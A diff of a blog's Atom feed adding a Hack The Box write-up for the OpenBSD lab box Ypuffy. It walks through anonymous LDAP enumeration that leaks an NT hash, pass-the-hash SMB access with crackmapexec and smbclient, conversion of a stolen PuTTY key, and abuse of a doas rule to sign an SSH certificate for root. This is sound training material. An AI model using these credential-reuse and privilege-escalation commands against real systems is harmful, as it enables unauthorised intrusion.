@@ -1,4 +1,413 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-02-05T16:01:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Dab</title><link href="http://localhost:4000/hack-the-box/dab/" rel="alternate" type="text/html" title="Hack The Box - Dab" /><published>2019-02-02T00:00:00+02:00</published><updated>2019-02-02T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/dab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/dab/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-02-09T00:04:43+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Ypuffy</title><link href="http://localhost:4000/hack-the-box/ypuffy/" rel="alternate" type="text/html" title="Hack The Box - Ypuffy" /><published>2019-02-09T00:00:00+02:00</published><updated>2019-02-09T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ypuffy</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ypuffy/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-ypuffy-retired-and-this-is-my-write-up-this-box-is-a-little-different-from-the-other-boxes-its-not-windows-or-linux--its-running-openbsd-which-is-a-unix-like-system-i-really-liked-the-privilege-escalation-in-this-box-because-it-had-some-cool-ssh-stuff-without-talking-too-much-lets-jump-right-in-its-a-medium-difficulty-box-and-its-ip-is-101010107--i-added-it-in-etchosts-as-ypuffyhtb&quot;&gt;Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ypuffy.htb&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-so-&quot;&gt;As always we will start with nmap so :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ypuffy.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;nmap-tells-us-that-theres-ssh-running-on-port-22--http-on-port-80--smb-on-port-139-and-445--ldap-on-port-389&quot;&gt;Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389&lt;/h4&gt;
+&lt;h4 id=&quot;it-also-tells-us-that-we-can-connect-anonymously-to-ldap&quot;&gt;It also tells us that we can connect anonymously to ldap.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;lets-check-http-first&quot;&gt;Let’s check http first&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;connection-reset-http-will-be-useful-later-but-not-now&quot;&gt;Connection reset. http will be useful later but not now.&lt;/h4&gt;
+&lt;h4 id=&quot;moving-on-to-the-next-thing--we-have-smb-lets-see-if-we-can-do-a-null-authentication-and-enumerate-the-shares-we-will-use-smbmap&quot;&gt;Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H ypuffy.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;access-denied&quot;&gt;Access Denied.&lt;/h4&gt;
+&lt;h4 id=&quot;lets-check-ldap&quot;&gt;Let’s check ldap&lt;/h4&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ldap&quot;&gt;LDAP&lt;/h3&gt;
+&lt;h4 id=&quot;nmap-told-us-that-anonymous-authentication-was-allowed-so-we-will-use-a-tool-called-ldapsearch&quot;&gt;nmap told us that anonymous authentication was allowed so we will use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;dc=hackthebox,dc=htb&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# hackthebox.htb
+dn: dc=hackthebox,dc=htb
+dc: hackthebox
+objectClass: top
+objectClass: domain
+
+# passwd, hackthebox.htb
+dn: ou=passwd,dc=hackthebox,dc=htb
+ou: passwd
+objectClass: top
+objectClass: organizationalUnit
+
+# bob8791, passwd, hackthebox.htb
+dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+uid: bob8791
+cn: Bob
+objectClass: account
+objectClass: posixAccount
+objectClass: top
+userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
+uidNumber: 5001
+gidNumber: 5001
+gecos: Bob
+homeDirectory: /home/bob8791
+loginShell: /bin/ksh
+
+# alice1978, passwd, hackthebox.htb
+dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+uid: alice1978
+cn: Alice
+objectClass: account
+objectClass: posixAccount
+objectClass: top
+objectClass: sambaSamAccount
+userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
+uidNumber: 5000
+gidNumber: 5000
+gecos: Alice
+homeDirectory: /home/alice1978
+loginShell: /bin/ksh
+sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+displayName: Alice
+sambaAcctFlags: [U          ]
+sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+sambaPwdLastSet: 1532916644
+
+# group, hackthebox.htb
+dn: ou=group,dc=hackthebox,dc=htb
+ou: group
+objectClass: top
+objectClass: organizationalUnit
+
+# bob8791, group, hackthebox.htb
+dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: bob8791
+userPassword:: e2NyeXB0fSo=
+gidNumber: 5001
+
+# alice1978, group, hackthebox.htb
+dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: alice1978
+userPassword:: e2NyeXB0fSo=
+gidNumber: 5000
+
+# ypuffy, hackthebox.htb
+dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+sambaDomainName: YPUFFY
+sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+sambaAlgorithmicRidBase: 1000
+objectclass: sambaDomain
+sambaNextUserRid: 1000
+sambaMinPwdLength: 5
+sambaPwdHistoryLength: 0
+sambaLogonToChgPwd: 0
+sambaMaxPwdAge: -1
+sambaMinPwdAge: 0
+sambaLockoutDuration: 30
+sambaLockoutObservationWindow: 30
+sambaLockoutThreshold: 0
+sambaForceLogoff: -1
+sambaRefuseMachinePwdChange: 0
+sambaNextRid: 1001
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 9
+# numEntries: 8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-also-use-nmap-to-enumerate-ldap--with-a-script-called-ldap-search&quot;&gt;we can also use nmap to enumerate ldap , with a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 389 --script ldap-search ypuffy.htb&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output&quot;&gt;Full Output:&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET
+Nmap scan report for ypuffy.htb (10.10.10.107)
+Host is up (0.14s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=hackthebox,dc=htb
+|     dn: dc=hackthebox,dc=htb
+|         dc: hackthebox
+|         objectClass: top
+|         objectClass: domain
+|     dn: ou=passwd,dc=hackthebox,dc=htb
+|         ou: passwd
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+|         uid: bob8791
+|         cn: Bob
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         userPassword: {BSDAUTH}bob8791
+|         uidNumber: 5001
+|         gidNumber: 5001
+|         gecos: Bob
+|         homeDirectory: /home/bob8791
+|         loginShell: /bin/ksh
+|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+|         uid: alice1978
+|         cn: Alice
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: sambaSamAccount
+|         userPassword: {BSDAUTH}alice1978
+|         uidNumber: 5000
+|         gidNumber: 5000
+|         gecos: Alice
+|         homeDirectory: /home/alice1978
+|         loginShell: /bin/ksh
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+|         displayName: Alice
+|         sambaAcctFlags: [U          ]
+|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+|         sambaPwdLastSet: 1532916644
+|     dn: ou=group,dc=hackthebox,dc=htb
+|         ou: group
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: bob8791
+|         userPassword: {crypt}*
+|         gidNumber: 5001
+|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: alice1978
+|         userPassword: {crypt}*
+|         gidNumber: 5000
+|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+|         sambaDomainName: YPUFFY
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+|         sambaAlgorithmicRidBase: 1000
+|         objectclass: sambaDomain
+|         sambaNextUserRid: 1000
+|         sambaMinPwdLength: 5
+|         sambaPwdHistoryLength: 0
+|         sambaLogonToChgPwd: 0
+|         sambaMaxPwdAge: -1
+|         sambaMinPwdAge: 0
+|         sambaLockoutDuration: 30
+|         sambaLockoutObservationWindow: 30
+|         sambaLockoutThreshold: 0
+|         sambaForceLogoff: -1
+|         sambaRefuseMachinePwdChange: 0
+|_        sambaNextRid: 1001
+
+Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-most-interesting-part-is-this-&quot;&gt;The most interesting part is this :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-get-a-username-alice1978-and-an-smb-nt-hash-0b186e661bbdbdcf6047784de8b9fd8b&quot;&gt;We get a username &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; and an smb NT hash &lt;code class=&quot;highlighter-rouge&quot;&gt;0B186E661BBDBDCF6047784DE8B9FD8B&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;this-hash-is-uncrackable-however-we-can-still-use-it-to-authenticate&quot;&gt;This hash is uncrackable however we can still use it to authenticate.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;we-need-to-list-the-shares-first-to-know-where-we-can-connect-we-can-use-a-tool-called-crackmapexec-&quot;&gt;We need to list the shares first to know where we can connect. We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;there-are-only-two-shares-alice-and-ipc--we-have-read-and-write-permissions-to-alice-and-no-access-to-ipc&quot;&gt;There are only two shares &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; , we have read and write permissions to &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; and no access to &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;we-can-also-use-smbclient-to-list-the-shares-&quot;&gt;We can also use smbclient to list the shares :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-it-doesnt-tell-us-which-shares-do-we-have-access-to-and-which-we-dont&quot;&gt;But it doesn’t tell us which shares do we have access to and which we don’t.&lt;/h4&gt;
+&lt;h4 id=&quot;so-we-know-that-we-can-access-the-share-alice--lets-connect&quot;&gt;So we know that we can access the share &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; , let’s connect.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;theres-only-one-file-called-my_private_keyppk--get-my_private_keyppk-to-download-it&quot;&gt;There’s only one file called &lt;code class=&quot;highlighter-rouge&quot;&gt;my_private_key.ppk&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;get my_private_key.ppk&lt;/code&gt; to download it.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ssh-and-getting-user&quot;&gt;SSH and getting user&lt;/h3&gt;
+&lt;h4 id=&quot;my_private_keyppk-is-a-putty-private-key--we-need-to-convert-that-to-an-ssh-private-key-to-be-able-to-ssh-with-it&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;my_private_key.ppk&lt;/code&gt; is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.&lt;/h4&gt;
+&lt;h4 id=&quot;on-kali-i-had-to-get-putty-tools-first&quot;&gt;On kali I had to get &lt;code class=&quot;highlighter-rouge&quot;&gt;putty-tools&lt;/code&gt; first&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install putty-tools&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-use-puttygen-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;puttygen&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;puttygen my_private_key.ppk -O private-openssh -o alice.key&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-lets-take-a-look-at-the-key-&quot;&gt;Now let’s take a look at the key :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;last-step-is-to-chmod-600-alicekey-and-finally-ssh&quot;&gt;Last step is to &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 alice.key&lt;/code&gt; and finally ssh&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i alice.key alice1978@ypuffy.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;more-enumeration&quot;&gt;More Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;remember-http--we-got-a-connection-reset-lets-check-etchttpdconf&quot;&gt;Remember http ? we got a connection reset. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/httpd.conf&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-see-two-interesting-things--location-userca-and-location-sshauth&quot;&gt;We see two interesting things , &lt;code class=&quot;highlighter-rouge&quot;&gt;location &quot;/userca*&quot;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;location &quot;/sshauth*&quot;&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;after-some-more-enumeration--there-are-3-users-on-the-box&quot;&gt;After some more enumeration , there are 3 users on the box&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;alice1978--bob8791-and-userca&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;bob8791&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;userca&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;bob8791-has-a-directory-called-dba&quot;&gt;bob8791 has a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;dba&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;inside-it-theres-an-sql-file-called-sshauthsql&quot;&gt;Inside it there’s an sql file called &lt;code class=&quot;highlighter-rouge&quot;&gt;sshauth.sql&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/13.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-creates-a-table-called-principals-and-another-table-called-keys&quot;&gt;It creates a table called &lt;code class=&quot;highlighter-rouge&quot;&gt;principals&lt;/code&gt; and another table called &lt;code class=&quot;highlighter-rouge&quot;&gt;keys&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;if-we-also-check-sshd_config-in-etcssh&quot;&gt;If we also check &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd_config&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ssh/&lt;/code&gt;&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $
+
+# This is the sshd server system-wide configuration file.  See
+# sshd_config(5) for more information.
+
+# The strategy used for options in the default sshd_config shipped with
+# OpenSSH is to specify options with their default value where
+# possible, but leave them commented.  Uncommented options override the
+# default value.
+
+#Port 22
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+#HostKey /etc/ssh/ssh_host_rsa_key
+#HostKey /etc/ssh/ssh_host_ecdsa_key
+#HostKey /etc/ssh/ssh_host_ed25519_key
+
+# Ciphers and keying
+#RekeyLimit default none
+
+# Logging
+#SyslogFacility AUTH
+#LogLevel INFO
+
+# Authentication:
+
+#LoginGraceTime 2m
+PermitRootLogin prohibit-password
+#StrictModes yes
+#MaxAuthTries 6
+#MaxSessions 10
+
+#PubkeyAuthentication yes
+
+# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
+# but this is overridden so installations will only check .ssh/authorized_keys
+AuthorizedKeysFile	.ssh/authorized_keys
+
+#AuthorizedPrincipalsFile none
+
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;amp;username=%u
+AuthorizedKeysCommandUser nobody
+
+TrustedUserCAKeys /home/userca/ca.pub
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;amp;username=%u
+AuthorizedPrincipalsCommandUser nobody
+
+# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
+#HostbasedAuthentication no
+# Change to yes if you don't trust ~/.ssh/known_hosts for
+# HostbasedAuthentication
+#IgnoreUserKnownHosts no
+# Don't read the user's ~/.rhosts and ~/.shosts files
+#IgnoreRhosts yes
+
+# To disable tunneled clear text passwords, change to no here!
+PasswordAuthentication no
+#PermitEmptyPasswords no
+
+# Change to no to disable s/key passwords
+ChallengeResponseAuthentication no
+
+AllowAgentForwarding no
+AllowTcpForwarding no
+#GatewayPorts no
+X11Forwarding no
+#X11DisplayOffset 10
+#X11UseLocalhost yes
+#PermitTTY yes
+#PrintMotd yes
+#PrintLastLog yes
+#TCPKeepAlive yes
+#UseLogin no
+#PermitUserEnvironment no
+#Compression delayed
+#ClientAliveInterval 0
+#ClientAliveCountMax 3
+#UseDNS no
+#PidFile /var/run/sshd.pid
+#MaxStartups 10:30:100
+#PermitTunnel no
+#ChrootDirectory none
+#VersionAddendum none
+
+# no default banner path
+#Banner none
+
+# override default of no subsystems
+Subsystem	sftp	/usr/libexec/sftp-server
+
+# Example of overriding settings on a per-user basis
+#Match User anoncvs
+#	X11Forwarding no
+#	AllowTcpForwarding no
+#	PermitTTY no
+#	ForceCommand cvs server
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-part-&quot;&gt;This part :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-that-http-service-is-responsible-for-some-ssh-authentication-stuff--and-we-can-request-keys-from-sshauthtypekeysusername-and-principals-from-sshauthtypeprincipalsusername--requesting-keys-for-root-gives-us-no-response--but-requesting-the-principal-we-get-3m3rgencyb4ckd00r&quot;&gt;So that http service is responsible for some ssh authentication stuff , and we can request keys from &lt;code class=&quot;highlighter-rouge&quot;&gt;/sshauth?type=keys&amp;amp;username=&lt;/code&gt; and principals from &lt;code class=&quot;highlighter-rouge&quot;&gt;/sshauth?type=principals&amp;amp;username=&lt;/code&gt; , requesting keys for root gives us no response , but requesting the principal we get &lt;code class=&quot;highlighter-rouge&quot;&gt;3m3rgencyB4ckd00r&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;generating-and-signing-ssh-keys--getting-root&quot;&gt;Generating and signing ssh keys , Getting root&lt;/h3&gt;
+&lt;h4 id=&quot;so-now-we-have-roots-principal-3m3rgencyb4ckd00r-theoretically-we-can-generate-ssh-keys-and-sign-them-with-roots-principal--and-we-will-be-able-to-ssh-as-root-with-them&quot;&gt;So now we have root’s principal &lt;code class=&quot;highlighter-rouge&quot;&gt;3m3rgencyB4ckd00r&lt;/code&gt;. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.&lt;/h4&gt;
+&lt;h4 id=&quot;the-problem-is--as-alice1978-we-are-not-authorized-to-do-this-on-linux-we-could-check-if-we-can-run-elevated-commands-with-sudo--l-but-here-theres-no-sudo--instead-of-that-theres-a-command-called-doas--if-we-check-the-config-file-for-it-&quot;&gt;The problem is , as &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; we are not authorized to do this. On linux we could check if we can run elevated commands with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; but here there’s no sudo , instead of that there’s a command called &lt;code class=&quot;highlighter-rouge&quot;&gt;doas&lt;/code&gt; , if we check the config file for it :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-run-ssh-keygen-as-userca-without-password&quot;&gt;We can run &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;userca&lt;/code&gt; without password.&lt;/h4&gt;
+&lt;h4 id=&quot;first-step-is-to-create-ssh-keys-for-alice1978&quot;&gt;First step is to create ssh keys for &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen -t rsa -f /tmp/id_rsa&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-need-the-certificate-ca-in-homeuserca-so-we-will-cd-there&quot;&gt;Then we need the certificate (&lt;code class=&quot;highlighter-rouge&quot;&gt;ca&lt;/code&gt;) in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/userca/&lt;/code&gt; so we will cd there&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-sign-the-ssh-keys-we-have-just-created-as-root&quot;&gt;And sign the ssh keys we have just created as root&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;-s-for-certificate---i-for-identity-and--n-for-principal&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; for certificate , &lt;code class=&quot;highlighter-rouge&quot;&gt;-I&lt;/code&gt; for identity and &lt;code class=&quot;highlighter-rouge&quot;&gt;-n&lt;/code&gt; for principal&lt;/h4&gt;
+&lt;h4 id=&quot;finally-we-will-ssh-as-root-&quot;&gt;Finally we will ssh as root :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i /tmp/id_rsa root@localhost&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/ypuffy/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
